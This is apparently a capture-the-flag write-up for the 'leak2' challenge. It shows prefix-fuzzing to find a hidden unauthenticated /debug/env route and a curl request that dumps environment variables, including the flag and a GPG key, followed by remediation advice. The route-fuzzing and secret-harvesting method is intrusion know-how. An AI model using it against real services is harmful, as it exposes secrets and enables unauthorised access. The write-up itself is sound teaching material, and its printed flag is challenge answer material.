# leak2 - Unauthenticated debug endpoint dumps env

| | |
|---|---|
| **Challenge** | leak2 |
| **Category** | INFOLEAK |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://leak2.chal.deti:8011 ("App / Normal API service") |
| **Leak class** | Hidden route - unauthenticated debug endpoint leaking env vars |

## Hint
> A normal API with a status page. Not every route is in the UI.
> There is a back room where the machine confesses the door has no key.

## Recon
The index links `/status`, but that path 404s - a decoy. Flat wordlist scans
(gobuster `common.txt` + `big.txt`) found nothing, so the real route is either
prefixed or non-dictionary. Source wasn't exposed (`/app.py`, `/.git` all 404).

Decode of the hint: **"back room"** = hidden route, **"the machine confesses"** = a
debug endpoint that dumps internal state, **"the door has no key"** = no auth required
(broken access control).

## Approach
Because the flat brute failed, fuzz words **under prefixes** (`/api/<w>`,
`/debug/<w>`, `/status/<w>`, …) - something gobuster's flat mode doesn't do. Written
as a small threaded Python fuzzer (`route-fuzz.py`) over the local
`common.txt` x 8 prefixes (~37k requests), filtering out 404s.

Two routes surfaced:
```
200  len=12   /api/ping      <- health check, returns {"ok":true} - not useful
200  len=417  /debug/env     <- the "back room": an env dump
```
(`/api/ping` confirmed as a plain health check: `curl .../api/ping` -> `{"ok":true}`.)

## Exploitation - the exact request
```bash
curl -s http://leak2.chal.deti:8011/debug/env
```

## Response fragment that carried the flag
```json
{"FLAG":"flag{35232b6a2f682c9be9419b70808103d9}",
 "GPG_KEY":"7169605F62C751356D054A26A821E680E5FA6305",
 "HOME":"/home/ctf","HOSTNAME":"4343ca271cd3",
 "SERVER_SOFTWARE":"gunicorn/26.2.0","PYTHON_VERSION":"3.12.14",
 "container":"podman", ...}
```
Secondary disclosure: a GPG key, exact gunicorn/Python versions, container hostname,
and the `podman` runtime - all useful for further fingerprinting.

## Flag
```
flag{35232b6a2f682c9be9419b70808103d9}
```

## Root cause & remediation
- **Cause:** a `/debug/env` route that returns `os.environ` with no authentication,
  left enabled in production. Debug/introspection endpoints should never be reachable,
  and secrets should not live in environment variables that such an endpoint echoes.
- **Fix:** remove debug/introspection routes from production builds (gate behind a
  build flag); require authentication on any ops endpoint; never serialize `environ`
  to clients; move secrets to a secret manager and scope them so a single dump can't
  reveal them. Also note `/api/ping` and `/debug/env` were discoverable only by
  prefix fuzzing - document that flat wordlists under-report nested routes.
